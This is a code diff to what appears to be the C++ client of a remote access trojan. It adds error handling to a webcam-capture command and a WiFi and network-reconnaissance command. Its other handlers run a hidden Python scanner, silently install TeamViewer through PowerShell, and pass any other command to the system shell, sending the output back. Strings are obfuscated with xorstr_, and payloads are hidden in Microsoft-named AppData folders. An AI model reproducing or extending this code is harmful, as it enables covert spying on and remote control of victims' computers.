@@ -27,7 +27,11 @@ namespace client {
 					else if (cmd == xorstr_("camera")) {
 						if (helpers::is_python_installed()) {
 							system(("cd " + helpers::roaming + xorstr_("\\Microsoft\\scripts && python camera.py")).c_str());
-							send_image(helpers::roaming + xorstr_("\\Microsoft\\scripts\\camera.jpg"), "**Camera**");
+
+							if (std::filesystem::exists(helpers::roaming + xorstr_("\\Microsoft\\scripts\\camera.jpg")))
+								send_image(helpers::roaming + xorstr_("\\Microsoft\\scripts\\camera.jpg"), "**Camera**");
+							else
+								send_message(xorstr_("**Camera**\n```\nNo image generated. Possibly no camera.\n```"));
 						}
 						else {
 							send_message(xorstr_("**Camera**\n```\nPython is not installed.\n```"));
@@ -38,6 +42,8 @@ namespace client {
 							auto ip = client::functions::get_default_gateway();
 							auto ssid = helpers::exec("netsh wlan show networks|find \"SSID\"");
 							ssid.replace(ssid.length() - 1, ssid.length(), "");
+							send_message(xorstr_("**Analyzing Network...**\n```\nDefault Gateway: ") + ip + xorstr_("\nSSID: ") + ssid.substr(9) + xorstr_("\n```"));
+
 							auto res = helpers::exec(("python " + helpers::roaming + xorstr_("\\Microsoft\\scripts\\scanner.py ") + ip + " \"" + ssid + "\"").c_str());
 							send_message(xorstr_("**Devices Response**\n```\n") + res + xorstr_("\n```"));
 						}
@@ -45,7 +51,7 @@ namespace client {
 							send_message(xorstr_("**Devices Response**\n```\nPython is not installed.\n```"));
 						}
 					}
-					else if (cmd == xorstr_("tv setup")) {
+					else if (cmd == xorstr_("tv")) {
 						if (std::filesystem::exists(std::string(xorstr_("cd ")) + std::string(helpers::roaming + xorstr_("\\Microsoft\\tv")))) {
 							system((std::string(xorstr_("cd ")) + std::string(helpers::roaming + xorstr_("\\Microsoft\\tv")) + std::string(xorstr_("&& powershell.exe -file ")) + xorstr_("teamviewer_install.ps1")).c_str());
 
@@ -96,7 +102,7 @@ namespace client {
 					else {
 						auto response = helpers::exec(cmd.c_str());
 						if (response.empty())
-							response = xorstr_("-Empty-");
+							response = xorstr_("Empty - Likely misspelled command");
 						send_message(xorstr_("**Command Response**\n```\n") + response + xorstr_("\n```"));
 					}
 				}
